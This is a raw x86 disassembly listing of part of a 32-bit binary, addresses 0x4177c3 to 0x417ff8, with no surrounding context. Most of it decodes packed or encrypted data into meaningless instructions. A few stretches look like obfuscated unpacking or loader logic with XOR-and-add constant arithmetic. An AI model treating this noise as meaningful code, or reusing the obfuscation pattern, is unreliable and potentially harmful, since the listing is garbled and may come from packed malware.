  4177c3:	je     0x4177f8
  4177c5:	imul   edi,esp,0xfffffff6
  4177c8:	jl     0x417833
  4177ca:	ds aad 0x6a
  4177cd:	jecxz  0x417849
  4177cf:	es sub cl,dh
  4177d2:	inc    esi
  4177d3:	xchg   edx,eax
  4177d4:	arpl   WORD PTR [ecx],bx
  4177d6:	(bad)  
  4177d8:	cmp    DWORD PTR [eax-0x61],edx
  4177db:	cmp    dl,dh
  4177dd:	je     0x4177e9
  4177df:	mov    DWORD PTR [ebp-0x6e],edi
  4177e2:	pop    esi
  4177e3:	jo     0x4177e6
  4177e5:	dec    ecx
  4177e6:	icebp  
  4177e7:	out    0xbd,eax
  4177e9:	and    bh,BYTE PTR [esi+0x1c806855]
  4177ef:	push   es
  4177f0:	cld    
  4177f1:	mov    ch,0xc1
  4177f3:	ins    DWORD PTR es:[edi],dx
  4177f4:	aad    0x61
  4177f6:	cmp    BYTE PTR [ebx+ecx*1],dl
  4177f9:	dec    ebx
  4177fa:	imul   edx,DWORD PTR [ebp-0x45],0xffffff95
  4177fe:	cmp    BYTE PTR [edx+0x38],dh
  417801:	jb     0x417810
  417803:	cmp    ah,BYTE PTR [ecx+0x2e]
  417806:	fstp   TBYTE PTR [eax+eax*2]
  417809:	xor    eax,0xeb0362f1
  41780e:	sbb    DWORD PTR [ebx+0x7db2c94a],ecx
  417814:	xchg   ebp,eax
  417815:	inc    eax
  417816:	or     al,0x54
  417818:	push   esp
  417819:	pusha  
  41781a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41781b:	pop    esi
  41781c:	mov    ecx,0x3eedac
  417821:	out    0xcd,al
  417823:	cmp    BYTE PTR [edx-0x50],0x4a
  417827:	jbe    0x417896
  417829:	fisubr WORD PTR [eax-0x58e8b36a]
  41782f:	inc    esp
  417830:	cmp    BYTE PTR [ebx-0x6ae38efd],dl
  417836:	fcom   QWORD PTR ds:[eax+0x31]
  41783a:	push   ss
  41783b:	push   ebx
  41783c:	imul   edi,esp,0x2fae9650
  417842:	jns    0x417803
  417844:	imul   edi,DWORD PTR [ecx+ecx*2],0xb818393d
  41784b:	aam    0x74
  41784d:	pop    edi
  41784e:	and    eax,0x301be283
  417853:	jecxz  0x4178b8
  417855:	retf   0x8f17
  417858:	inc    edx
  417859:	ins    BYTE PTR es:[edi],dx
  41785a:	push   edi
  41785b:	cmp    ah,BYTE PTR [ecx+0x742a4e1d]
  417861:	add    esp,DWORD PTR [ecx-0x6e]
  417864:	or     ch,BYTE PTR ss:[ebx+0x10]
  417868:	popa   
  417869:	mov    DWORD PTR [esi+edx*2],ebx
  41786c:	out    0x73,al
  41786e:	mov    al,ds:0x5d7f404b
  417873:	sub    esi,DWORD PTR [esi-0x7ef4502c]
  417879:	imul   ebp,DWORD PTR [edx],0xffffffb2
  41787c:	xlat   BYTE PTR ds:[ebx]
  41787d:	sub    eax,0xf6d4aad0
  417882:	(bad)  
  417883:	cmc    
  417884:	jecxz  0x417868
  417886:	iret   
  417887:	(bad)  
  417888:	fwait
  417889:	jae    0x417876
  41788b:	cli    
  41788c:	outs   dx,BYTE PTR ds:[esi]
  41788d:	stos   BYTE PTR es:[edi],al
  41788e:	outs   dx,DWORD PTR ds:[esi]
  41788f:	retf   0x9bc0
  417892:	popa   
  417893:	add    BYTE PTR [ecx],al
  417895:	test   eax,0xcecef16f
  41789a:	inc    esi
  41789b:	push   edi
  41789c:	xchg   ebx,eax
  41789d:	mov    eax,ds:0xd21394d1
  4178a2:	push   edi
  4178a3:	adc    ah,0x90
  4178a6:	fcom   DWORD PTR [ebp+0x502566ac]
  4178ac:	and    edx,esp
  4178ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178af:	mov    ah,0x3
  4178b1:	addr16 pop esp
  4178b3:	outs   dx,DWORD PTR ds:[esi]
  4178b4:	ret    0xd9db
  4178b7:	out    0x46,al
  4178b9:	js     0x41788d
  4178bb:	fsubrp st(3),st
  4178bd:	cs pop ebp
  4178bf:	mov    esp,0x2a01b828
  4178c4:	adc    al,0x57
  4178c6:	mov    dh,BYTE PTR [edi-0x775d386c]
  4178cc:	ret    
  4178cd:	xor    al,0xd4
  4178cf:	dec    ecx
  4178d0:	imul   eax,DWORD PTR [ebx],0x48
  4178d3:	cmp    al,0xe9
  4178d5:	and    eax,DWORD PTR [edx]
  4178d7:	add    BYTE PTR [eax],al
  4178d9:	cmp    eax,0xced7cecf
  4178de:	aad    0xc5
  4178e0:	aad    0x63
  4178e2:	popa   
  4178e3:	adc    DWORD PTR [edi],edx
  4178e5:	fwait
  4178e6:	in     eax,dx
  4178e7:	loopne 0x4178da
  4178e9:	add    al,0x33
  4178eb:	jg     0x417965
  4178ed:	add    eax,0xed78787e
  4178f2:	scas   eax,DWORD PTR es:[edi]
  4178f3:	ret    
  4178f4:	jecxz  0x4178d0
  4178f6:	stos   DWORD PTR es:[edi],eax
  4178f7:	nop
  4178f8:	jb     0x417897
  4178fa:	repz ret 0x98e5
  4178fe:	js     0x4178f5
  417900:	div    DWORD PTR [esi+edi*2]
  417903:	cld    
  417904:	ins    BYTE PTR es:[edi],dx
  417905:	push   edx
  417906:	push   0x899ffc8c
  41790b:	add    dl,ah
  41790d:	push   ebx
  41790e:	adc    DWORD PTR [edx],eax
  417910:	push   ebp
  417911:	into   
  417912:	std    
  417913:	or     BYTE PTR [edi],0x3b
  417916:	adc    BYTE PTR [eax+edx*1],0xf8
  41791a:	mov    ebx,0x215bbaf0
  41791f:	add    eax,0x13ef1473
  417924:	daa    
  417925:	and    al,0x29
  417927:	sbb    esi,edi
  417929:	push   es
  41792a:	ja     0x4179a1
  41792c:	jne    0x41792d
  41792e:	in     eax,0x5c
  417930:	cmp    bh,BYTE PTR [edi+0x27fcb3b2]
  417936:	dec    ebx
  417937:	xchg   BYTE PTR ds:0xb1207076,bl
  41793d:	cmp    al,0xc9
  41793f:	shl    BYTE PTR [ecx+ecx*1+0x25],0x19
  417944:	(bad)  
  417945:	leave  
  417946:	push   esi
  417947:	and    al,0x2e
  417949:	xchg   esi,eax
  41794a:	sub    al,0x5
  41794c:	fild   DWORD PTR [edi+0x70]
  41794f:	cdq    
  417950:	test   BYTE PTR [ebx+0x67],bh
  417953:	cs stc 
  417955:	std    
  417956:	je     0x417935
  417958:	dec    ebx
  417959:	mov    ebx,0xbfa14343
  41795e:	or     BYTE PTR [esp+edx*1-0x5ef5fa6f],0x8b
  417966:	cmp    BYTE PTR [eax-0x30],ah
  417969:	jns    0x417951
  41796b:	gs pop ecx
  41796d:	push   edx
  41796e:	dec    ebx
  41796f:	in     eax,dx
  417970:	sub    al,0xc6
  417972:	rcl    DWORD PTR [ebp+0x2d606dc5],cl
  417978:	sbb    BYTE PTR [ecx-0xed8df80],0x9b
  41797f:	inc    eax
  417980:	cmp    bh,BYTE PTR [ecx+ebx*8]
  417983:	mov    BYTE PTR [esi-0x5c],dh
  417986:	aas    
  417987:	in     eax,dx
  417988:	hlt    
  417989:	jle    0x417961
  41798b:	dec    ecx
  41798c:	mov    ah,0x33
  41798e:	push   ebx
  41798f:	jmp    DWORD PTR [ebx]
  417991:	push   0x34
  417993:	push   0xb1d23cfb
  417998:	xor    al,0xab
  41799a:	xor    DWORD PTR [edi],edi
  41799c:	pop    ds
  41799d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41799e:	pop    edi
  41799f:	sahf   
  4179a0:	enter  0xe660,0xd4
  4179a4:	cmp    DWORD PTR [eax-0x2d8783d4],ecx
  4179aa:	lods   al,BYTE PTR ds:[esi]
  4179ab:	sub    eax,0xed5936dd
  4179b0:	jne    0x41799c
  4179b2:	scas   eax,DWORD PTR es:[edi]
  4179b3:	nop
  4179b4:	sub    al,0xee
  4179b6:	out    dx,eax
  4179b7:	call   0x3d2a:0xd061515c
  4179be:	push   ebx
  4179bf:	data16 mov WORD PTR [edi+ebp*1-0x25],fs
  4179c4:	jl     0x417956
  4179c6:	jmp    0x4179b2
  4179c8:	xchg   DWORD PTR [ebx+0x65],esp
  4179cb:	nop
  4179cc:	mov    ds:0x443166ee,eax
  4179d1:	les    eax,FWORD PTR [edi]
  4179d3:	fs jmp 0x45233ebd
  4179d9:	sar    BYTE PTR [ecx],cl
  4179db:	dec    ecx
  4179dc:	popa   
  4179dd:	out    dx,al
  4179de:	jecxz  0x4179f0
  4179e0:	imul   eax,DWORD PTR [ebp-0x49ebc33],0x5d
  4179e7:	xlat   BYTE PTR ds:[ebx]
  4179e8:	cmp    al,0x92
  4179ea:	scas   eax,DWORD PTR es:[edi]
  4179eb:	retf   
  4179ec:	push   cs
  4179ed:	mov    ds:0xc8b518f,al
  4179f2:	es shl ah,cl
  4179f5:	shl    edx,0x40
  4179f8:	mov    cl,0xb2
  4179fa:	mov    bh,0x99
  4179fc:	inc    ebp
  4179fd:	dec    eax
  4179fe:	(bad)  [ebp+0x368ceab6]
  417a04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a05:	out    0x25,al
  417a07:	arpl   dx,bp
  417a09:	sub    bh,dl
  417a0b:	cs dec ebx
  417a0d:	xchg   ebx,eax
  417a0e:	iret   
  417a0f:	cs leave 
  417a11:	inc    esi
  417a12:	test   DWORD PTR [edx],ebp
  417a14:	sub    eax,0x3de2f0b8
  417a19:	je     0x417a49
  417a1b:	rcl    ah,1
  417a1d:	call   0x21d1:0x66ae85d6
  417a24:	dec    edx
  417a25:	xor    al,0x96
  417a27:	(bad)  
  417a28:	fnstsw WORD PTR [ebx]
  417a2a:	fcomp  QWORD PTR [esi+0x5]
  417a2d:	icebp  
  417a2e:	jnp    0x417a03
  417a30:	(bad)  
  417a31:	je     0x4179fd
  417a33:	sub    DWORD PTR ds:0x590378b6,ebx
  417a39:	add    DWORD PTR [ebx+0x6188101c],ebx
  417a3f:	jb     0x4179f2
  417a41:	loop   0x417a7e
  417a43:	dec    BYTE PTR [ebp-0x2fa4cc97]
  417a49:	imul   edi,DWORD PTR [esi-0x44],0x14
  417a4d:	sbb    esp,ebx
  417a4f:	rcr    DWORD PTR [edi+0x7d],1
  417a52:	inc    edx
  417a53:	add    DWORD PTR [ecx-0x1b],esi
  417a56:	ret    0xca2e
  417a59:	rdmsr  
  417a5b:	sbb    BYTE PTR [edi+0x7fa03b0c],al
  417a61:	or     eax,0x371c8bba
  417a66:	sub    eax,0x80246809
  417a6b:	or     eax,0x7abbc6fb
  417a70:	fsubrp st(4),st
  417a72:	cmp    eax,0x1a45bdfa
  417a77:	push   esp
  417a78:	(bad)
  417a7c:	fld1   
  417a7e:	xor    eax,0xc5a923a1
  417a83:	fld    QWORD PTR [ebx+0x6d]
  417a86:	jae    0x417a42
  417a88:	mov    al,ds:0xb0689c25
  417a8d:	test   eax,0xb4396c5c
  417a92:	or     ebx,DWORD PTR [ecx+edx*4+0x7e]
  417a96:	sbb    DWORD PTR [ebx-0x4c713d49],edi
  417a9c:	lahf   
  417a9d:	into   
  417a9e:	dec    esi
  417a9f:	mov    esi,0xd845f673
  417aa4:	pop    ebx
  417aa5:	popa   
  417aa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417aa7:	sub    ebx,DWORD PTR [edx-0x6a198c67]
  417aad:	popf   
  417aae:	sbb    BYTE PTR [edx],bl
  417ab0:	dec    ebp
  417ab1:	je     0x417a9c
  417ab3:	test   al,0x6e
  417ab5:	pop    ebp
  417ab6:	and    BYTE PTR ds:0x3eab9891,dh
  417abc:	or     esi,ebp
  417abe:	je     0x417aff
  417ac0:	jl     0x417a7d
  417ac2:	mov    dl,0x9c
  417ac4:	sub    DWORD PTR [ebx-0x4934196],0x5e64e813
  417ace:	adc    bl,BYTE PTR [ebx]
  417ad0:	mov    ah,0x4f
  417ad2:	xchg   esi,eax
  417ad3:	jbe    0x417b14
  417ad5:	jp     0x417ae5
  417ad7:	repz jne 0x417ab9
  417ada:	stc    
  417adb:	cs pushf 
  417add:	xchg   edi,eax
  417ade:	inc    ebx
  417adf:	bound  esp,QWORD PTR [ecx+0x77]
  417ae2:	in     eax,dx
  417ae3:	out    0xea,eax
  417ae5:	outs   dx,BYTE PTR ds:[esi]
  417ae6:	rol    esi,1
  417ae8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ae9:	bound  ecx,QWORD PTR [edx-0x1800aff1]
  417aef:	out    0x15,al
  417af1:	xchg   esi,eax
  417af2:	into   
  417af3:	add    bh,BYTE PTR [ebx+0x2b0b871d]
  417af9:	fidivr DWORD PTR [ebp+ebp*2+0x510850ba]
  417b00:	pop    es
  417b01:	mov    DWORD PTR [ebp+0x8],ecx
  417b04:	mov    eax,DWORD PTR [ebp-0x4]
  417b07:	xor    eax,edx
  417b09:	push   esi
  417b0a:	mov    esi,DWORD PTR [ebp+0x8]
  417b0d:	mov    ecx,0x327298
  417b12:	add    eax,ecx
  417b14:	cmp    DWORD PTR [esi+0x54],eax
  417b17:	pop    esi
  417b18:	je     0x417b26
  417b1e:	mov    eax,DWORD PTR [ebp+0x8]
  417b21:	jmp    0x417d67
  417b26:	mov    eax,DWORD PTR [ebp-0x4]
  417b29:	xor    eax,edx
  417b2b:	add    eax,ecx
  417b2d:	jmp    0x417d67
  417b32:	mov    eax,DWORD PTR [ebp-0x4]
  417b35:	jmp    0x417d5d
  417b3a:	cmp    eax,0xd53cc6d6
  417b3f:	int3   
  417b40:	leave  
  417b41:	fnstenv [esi-0x47]
  417b44:	or     eax,0x8c00476c
  417b49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b4a:	adc    DWORD PTR [ecx],esi
  417b4c:	jg     0x417bc6
  417b4e:	add    eax,0xd78787e
  417b53:	cmp    esp,DWORD PTR [ecx]
  417b55:	jmp    0x417b43
  417b57:	ja     0x417bcc
  417b59:	sbb    DWORD PTR [eax-0x1fa3f008],0x1
  417b60:	(bad)  
  417b61:	mov    ds,WORD PTR [edx+0x1c4bb8]
  417b67:	mov    dh,0xf2
  417b69:	or     al,0xb9
  417b6b:	fist   WORD PTR [edx+0x64adb9e0]
  417b71:	sbb    dl,BYTE PTR [ebp+0x30]
  417b74:	nop
  417b75:	jns    0x417b1b
  417b77:	cs aas 
  417b79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b7a:	mov    ds:0x1651c489,al
  417b7f:	pop    ebp
  417b80:	xchg   edx,eax
  417b81:	mov    bl,0x27
  417b83:	bound  eax,QWORD PTR [ebx]
  417b85:	jle    0x417c02
  417b87:	add    eax,0x46275921
  417b8c:	cmp    DWORD PTR [edi+0x38776ddd],edx
  417b92:	jmp    0x22c7:0x4cc6b36e
  417b99:	arpl   WORD PTR [edx-0x222511f8],sp
  417b9f:	push   ebx
  417ba0:	ss xchg ebp,eax
  417ba2:	rol    BYTE PTR es:[edi],cl
  417ba5:	ret    
  417ba6:	push   edx
  417ba7:	mul    bl
  417ba9:	retf   0xd4c2
  417bac:	jmp    0xd07cfd2b
  417bb1:	popf   
  417bb2:	jmp    0x54d:0x3488f96c
  417bb9:	test   DWORD PTR [ebp+0x3d03ff12],edi
  417bbf:	fcmovbe st,st(0)
  417bc1:	dec    edi
  417bc2:	out    0xcb,al
  417bc4:	adc    eax,0x79453d2f
  417bc9:	iret   
  417bca:	popf   
  417bcb:	and    DWORD PTR [ebp+0x5eda41cc],ecx
  417bd1:	in     al,dx
  417bd2:	repz sbb esp,DWORD PTR gs:[esi-0xd]
  417bd7:	inc    ebp
  417bd8:	add    ah,BYTE PTR [ebx-0x36]
  417bdb:	or     BYTE PTR [ebp-0x5e0b1fe9],0x43
  417be2:	or     DWORD PTR [esi+0x6088b836],eax
  417be8:	ror    BYTE PTR [ebp+0x4],cl
  417beb:	xchg   edx,eax
  417bec:	xlat   BYTE PTR ds:[ebx]
  417bed:	or     dh,0xfd
  417bf0:	push   ecx
  417bf1:	sar    DWORD PTR [edx-0x5e],1
  417bf4:	enter  0xc549,0xba
  417bf8:	js     0x417c46
  417bfa:	(bad)  
  417bfb:	call   DWORD PTR [edx-0x11]
  417bfe:	aad    0x80
  417c00:	inc    esi
  417c01:	inc    ebx
  417c02:	dec    edi
  417c03:	(bad)  
  417c05:	fisttp WORD PTR [edx+edi*1-0xaf1a375]
  417c0c:	pop    edi
  417c0d:	sub    cl,BYTE PTR [esi]
  417c0f:	cli    
  417c10:	stos   DWORD PTR es:[edi],eax
  417c11:	pop    ax
  417c13:	hlt    
  417c14:	in     eax,0xff
  417c16:	push   ss
  417c17:	addr16 pop es
  417c19:	cmp    ebp,0xffffffd9
  417c1c:	es sub eax,0xc80fc047
  417c22:	call   0x6d0:0x1cf5bbb9
  417c29:	or     DWORD PTR [ebp-0x1008a8fc],edi
  417c2f:	push   ebp
  417c30:	inc    eax
  417c31:	jmp    0xb332461e
  417c36:	xchg   edi,eax
  417c37:	je     0x417cb5
  417c39:	stos   BYTE PTR es:[edi],al
  417c3a:	cmp    ebp,DWORD PTR [edi]
  417c3c:	xchg   DWORD PTR [ebx-0x5f341a1f],ecx
  417c42:	push   0xfffffffb
  417c44:	daa    
  417c45:	imul   eax,edi,0x40
  417c48:	adc    edx,DWORD PTR [edi]
  417c4a:	scas   eax,DWORD PTR es:[edi]
  417c4b:	adc    BYTE PTR ds:[ebp-0x6751bc0d],al
  417c52:	mov    al,BYTE PTR [edx+ecx*2+0x5f718200]
  417c59:	(bad)  
  417c5a:	mov    ah,0x32
  417c5c:	hlt    
  417c5d:	pop    edx
  417c5e:	in     al,dx
  417c5f:	adc    ah,BYTE PTR [esi-0x5d]
  417c62:	pop    eax
  417c63:	leave  
  417c64:	mov    dh,0x1e
  417c66:	jle    0x417c32
  417c68:	in     al,0x96
  417c6a:	or     al,0xcd
  417c6c:	or     ch,BYTE PTR [edi]
  417c6e:	dec    ebp
  417c6f:	lea    ebx,[ebx-0x118a0d8d]
  417c75:	push   ds
  417c76:	mov    eax,es
  417c78:	js     0x417ca1
  417c7a:	sub    DWORD PTR [edi],ebp
  417c7c:	jge    0x417c49
  417c7e:	fs push 0x36
  417c81:	mov    WORD PTR [ecx+0x6b263a85],fs
  417c87:	cmp    al,0x62
  417c89:	mov    al,0x4c
  417c8b:	lods   al,BYTE PTR ds:[esi]
  417c8c:	fmul   st(5),st
  417c8e:	loop   0x417cf6
  417c90:	test   dl,ah
  417c92:	xor    BYTE PTR [edi],ah
  417c94:	sbb    al,0xa4
  417c96:	fs jns 0x417c4e
  417c99:	ds sbb ch,bl
  417c9c:	pop    esi
  417c9d:	mov    ss,WORD PTR [eax+0x35]
  417ca0:	clc    
  417ca1:	xor    eax,0x16feda35
  417ca6:	push   ds
  417ca7:	xchg   ebp,eax
  417ca8:	sti    
  417ca9:	xchg   ebp,eax
  417caa:	dec    esp
  417cab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417cac:	arpl   WORD PTR [esp+ebx*4-0x20abe1b5],sp
  417cb3:	fmul   DWORD PTR [ebx-0xf]
  417cb6:	xor    edx,DWORD PTR ds:0x5e7dafa6
  417cbc:	xor    ebx,DWORD PTR [edi]
  417cbe:	push   ds
  417cbf:	mov    edi,0xa1d66602
  417cc4:	repnz ins BYTE PTR es:[edi],dx
  417cc6:	and    BYTE PTR [ebx-0x59],dh
  417cc9:	xchg   ecx,eax
  417cca:	mov    al,0xfc
  417ccc:	jns    0x417d0b
  417cce:	clc    
  417ccf:	imul   esp,esp,0x47
  417cd2:	push   edi
  417cd3:	loop   0x417cc6
  417cd5:	jo     0x417d3c
  417cd7:	sub    BYTE PTR [edi+ebp*8-0x4f],ch
  417cdb:	mov    ecx,0x33f0d135
  417ce0:	in     eax,0x35
  417ce2:	test   DWORD PTR [eax-0x4e],edx
  417ce5:	test   edi,0xda1dc5da
  417ceb:	mov    ecx,0x60cecb50
  417cf0:	ret    0xd154
  417cf3:	in     al,0xd7
  417cf5:	in     eax,dx
  417cf6:	sbb    BYTE PTR [ebp-0x7eb5bae3],ah
  417cfc:	mov    ebp,0xddec7ef7
  417d01:	jmp    0x6d52:0xfd9f5c42
  417d08:	jmp    0x3090:0x7221132
  417d0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d10:	sbb    al,0x50
  417d12:	pop    ebp
  417d13:	mov    ss,WORD PTR [esi-0x11]
  417d16:	out    0x66,al
  417d18:	dec    ebx
  417d19:	ret    
  417d1a:	iret   
  417d1b:	jb     0x417d4a
  417d1d:	retf   
  417d1e:	xchg   DWORD PTR ds:0xb8ffc735,esi
  417d24:	or     eax,0xc906ccc5
  417d29:	and    eax,0xc58850d2
  417d2e:	xor    eax,0x4d6c6d27
  417d33:	(bad)  
  417d34:	adc    ch,BYTE PTR [eax+0x73]
  417d37:	fadd   QWORD PTR [ebx+0x77ad2df2]
  417d3d:	inc    edx
  417d3e:	fstp   QWORD PTR [ebx-0x35d38dd1]
  417d44:	retf   
  417d45:	mov    ecx,0x7b9955d7
  417d4a:	jne    0x417d04
  417d4c:	iret   
  417d4d:	mov    bh,0xfa
  417d4f:	ja     0x417d64
  417d51:	dec    esp
  417d52:	ja     0x417db4
  417d54:	rcl    BYTE PTR [esi],cl
  417d56:	loop   0x417dc3
  417d58:	popa   
  417d59:	clc    
  417d5a:	repnz shl DWORD PTR [ebp+0x51085035],cl
  417d61:	pop    es
  417d62:	add    eax,0x327298
  417d67:	leave  
  417d68:	ret    0x4
  417d6b:	push   ebp
  417d6c:	mov    ebp,esp
  417d6e:	push   ecx
  417d6f:	and    DWORD PTR ds:0x42a801,0x0
  417d79:	jmp    0x417d8b
  417d7e:	mov    ecx,DWORD PTR ds:0x42a801
  417d84:	inc    ecx
  417d85:	mov    DWORD PTR ds:0x42a801,ecx
  417d8b:	cmp    DWORD PTR ds:0x42a801,0x13
  417d92:	jae    0x417dbe
  417d98:	cmp    DWORD PTR ds:0x42a801,0x16
  417d9f:	jne    0x417db3
  417da5:	push   0x42a805
  417daa:	push   DWORD PTR [ebp-0x18]
  417dad:	call   DWORD PTR ds:0x41d1f8
  417db3:	jmp    0x417d7e
  417db8:	adc    eax,DWORD PTR ds:0x42a77d
  417dbe:	mov    ecx,DWORD PTR [ebp+0x8]
  417dc1:	inc    eax
  417dc2:	mov    eax,0x7510850
  417dc7:	and    DWORD PTR ds:0x42a83d,0x42a831
  417dd1:	xor    ecx,eax
  417dd3:	or     DWORD PTR ds:0x42a835,0x42a889
  417ddd:	add    ecx,0x327298
  417de3:	mov    DWORD PTR ds:0x42a775,0xf60
  417ded:	mov    DWORD PTR [ebp+0x10],ecx
  417df0:	not    ecx
  417df2:	mov    DWORD PTR [ebp+0x8],0xf34cebc
  417df9:	mov    DWORD PTR ds:0x42a835,ebx
  417dff:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  417e06:	mov    DWORD PTR ds:0x42a80d,edi
  417e0c:	mov    ecx,0xf89c8539
  417e11:	push   esi
  417e12:	mov    DWORD PTR [ebp+0x10],0x70019fa
  417e19:	mov    esi,0x3248
  417e1e:	mov    esi,DWORD PTR [ebp-0x4]
  417e21:	cmp    ecx,esi
  417e23:	mov    DWORD PTR ds:0x42a759,0x4596
  417e2d:	je     0x4187eb
  417e33:	and    DWORD PTR ds:0x42a7f1,0x0
  417e3d:	jmp    0x417e51
  417e42:	xor    esi,esi
  417e44:	or     esi,DWORD PTR ds:0x42a7f1
  417e4a:	inc    esi
  417e4b:	mov    DWORD PTR ds:0x42a7f1,esi
  417e51:	cmp    DWORD PTR ds:0x42a7f1,0x11
  417e58:	jae    0x418196
  417e5e:	cmp    DWORD PTR ds:0x42a7f1,0x1d
  417e65:	jne    0x417e77
  417e6b:	push   DWORD PTR [ebp-0x28]
  417e6e:	push   DWORD PTR [ebp-0x14]
  417e71:	call   DWORD PTR ds:0x41d274
  417e77:	jmp    0x417e42
  417e7c:	jmp    0x418196
  417e81:	ret    
  417e82:	ret    0xc0c0
  417e85:	(bad)
  417e88:	leave  
  417e89:	retf   0xfdf1
  417e8c:	jmp    FWORD PTR [esi+0x34]
  417e8f:	adc    al,0x42
  417e91:	push   ds
  417e92:	aaa    
  417e93:	jg     0x417f0d
  417e95:	jnp    0x417f15
  417e97:	js     0x417f11
  417e99:	xor    al,0x2e
  417e9b:	pushf  
  417e9c:	inc    eax
  417e9d:	push   edx
  417e9e:	dec    DWORD PTR [edi-0x19846575]
  417ea4:	and    al,BYTE PTR [eax+0x5f]
  417ea7:	sar    DWORD PTR [ebp-0x28],cl
  417eaa:	repnz adc al,0xa2
  417ead:	mov    bh,0xa0
  417eaf:	out    0x55,eax
  417eb1:	jne    0x417eef
  417eb3:	mov    al,0x9a
  417eb5:	cmp    BYTE PTR [edi+0x40],ah
  417eb8:	jmp    FWORD PTR gs:[ebp+ecx*1+0x32]
  417ebd:	mov    ds:0x8ce87a8a,eax
  417ec2:	rcr    BYTE PTR [edi-0x60495f71],cl
  417ec8:	stos   BYTE PTR es:[edi],al
  417ec9:	lods   eax,DWORD PTR ds:[esi]
  417eca:	add    al,0x46
  417ecc:	push   edi
  417ecd:	mov    edx,esi
  417ecf:	xchg   edi,eax
  417ed0:	add    esp,DWORD PTR [ecx]
  417ed2:	jmp    0x56e0cab3
  417ed7:	add    eax,0xd21553cd
  417edc:	loopne 0x417f0b
  417ede:	repz inc esi
  417ee0:	cmc    
  417ee1:	add    BYTE PTR [ecx+0x3b07d632],0xe3
  417ee8:	scas   al,BYTE PTR es:[edi]
  417ee9:	out    0xce,al
  417eeb:	fucomp st(6)
  417eed:	in     al,0xfd
  417eef:	jo     0x417f40
  417ef1:	pop    esi
  417ef2:	xor    eax,DWORD PTR [ecx-0x3b]
  417ef5:	cmp    esi,ebx
  417ef7:	out    0x79,al
  417ef9:	(bad)  
  417efa:	xor    eax,0xd23cdd79
  417eff:	fdivp  st(3),st
  417f01:	inc    edx
  417f02:	sbb    edi,DWORD PTR [eax-0x66df816a]
  417f08:	adc    eax,0x74bfb1cb
  417f0d:	sar    DWORD PTR [edi-0x70],cl
  417f10:	imul   edx,DWORD PTR [edi+edi*4+0x33],0xcd021523
  417f18:	sahf   
  417f19:	add    edi,edi
  417f1b:	lods   eax,DWORD PTR ds:[esi]
  417f1c:	and    BYTE PTR [eax],al
  417f1e:	xor    eax,DWORD PTR [ebp-0x57]
  417f21:	scas   al,BYTE PTR es:[edi]
  417f22:	mov    ch,0x67
  417f24:	xchg   edi,eax
  417f25:	dec    esp
  417f26:	push   es
  417f27:	rep ins BYTE PTR es:[edi],dx
  417f29:	repz xor BYTE PTR gs:[edx-0x73e0028e],0xd5
  417f32:	bound  ebx,QWORD PTR [eax+0x76]
  417f35:	or     dh,0xfa
  417f38:	or     DWORD PTR [ecx-0x17775d9],eax
  417f3e:	cs xchg esi,eax
  417f40:	call   0xc4e1:0x7d5ea6ba
  417f47:	adc    ebx,DWORD PTR [edx+0x1]
  417f4a:	lea    eax,[edx]
  417f4c:	inc    ebp
  417f4d:	ficomp WORD PTR [edx-0x658ea38]
  417f53:	(bad)  
  417f54:	push   ds
  417f55:	inc    ebx
  417f56:	test   eax,0x2fa73eb2
  417f5b:	and    ecx,ecx
  417f5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f5e:	out    dx,eax
  417f5f:	frstor [ebx+0x1678a90e]
  417f65:	sub    DWORD PTR [edi-0x15],eax
  417f68:	fnstsw WORD PTR [edx-0x412ebcfe]
  417f6e:	test   ah,cl
  417f70:	out    dx,al
  417f71:	sbb    esi,DWORD PTR [ebp-0x7bbe8bfc]
  417f77:	dec    ebp
  417f78:	adc    esi,ebx
  417f7a:	out    dx,al
  417f7b:	nop
  417f7c:	js     0x417f05
  417f7e:	jl     0x417f4e
  417f80:	sub    edx,DWORD PTR [eax]
  417f82:	sti    
  417f83:	cmp    DWORD PTR [ebx+0x3a],edx
  417f86:	xor    cl,BYTE PTR [esi]
  417f88:	or     DWORD PTR [ebx-0x10],esi
  417f8b:	cmp    eax,0x987c9e6f
  417f90:	ret    
  417f91:	add    cl,BYTE PTR [ecx]
  417f93:	or     BYTE PTR [edx+0x3726f1f5],bl
  417f99:	mov    ah,0x4a
  417f9b:	push   esp
  417f9c:	(bad)  
  417f9d:	mov    dl,0xf6
  417f9f:	nop
  417fa0:	pop    ecx
  417fa1:	jl     0x418013
  417fa3:	xchg   ebx,eax
  417fa4:	cmp    esp,DWORD PTR [edi*4+0x68fc100f]
  417fab:	xlat   BYTE PTR ds:[ebx]
  417fac:	cwde   
  417fad:	push   eax
  417fae:	jmp    0x7716:0x93a74d41
  417fb5:	aam    0x4d
  417fb7:	jge    0x417f69
  417fb9:	xchg   esi,eax
  417fba:	std    
  417fbb:	mov    ds,esp
  417fbd:	push   esi
  417fbe:	shl    BYTE PTR [esi-0x39],0x14
  417fc2:	sub    al,0x7b
  417fc4:	cwde   
  417fc5:	loope  0x418030
  417fc7:	xchg   BYTE PTR [eax],dh
  417fc9:	sbb    BYTE PTR [ebp+edx*2+0x65],ah
  417fcd:	xchg   esi,eax
  417fcf:	mov    edi,0x16eb9f7e
  417fd4:	in     eax,dx
  417fd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fd6:	and    ah,BYTE PTR [edi+0x58d049e2]
  417fdc:	popf   
  417fdd:	das    
  417fde:	xchg   DWORD PTR [eax+ebp*2],ebx
  417fe1:	fwait
  417fe2:	add    bl,cl
  417fe4:	xlat   BYTE PTR ds:[ebx]
  417fe5:	(bad)  
  417fe6:	cmc    
  417fe7:	jmp    0xe674db3a
  417fec:	in     al,dx
  417fed:	lods   eax,DWORD PTR ds:[esi]
  417fee:	and    ecx,edx
  417ff0:	cmp    bh,BYTE PTR [eax+0x4ae5772f]
  417ff6:	xchg   ebp,eax
  417ff7:	dec    esp
  417ff8:	jge    0x41804a
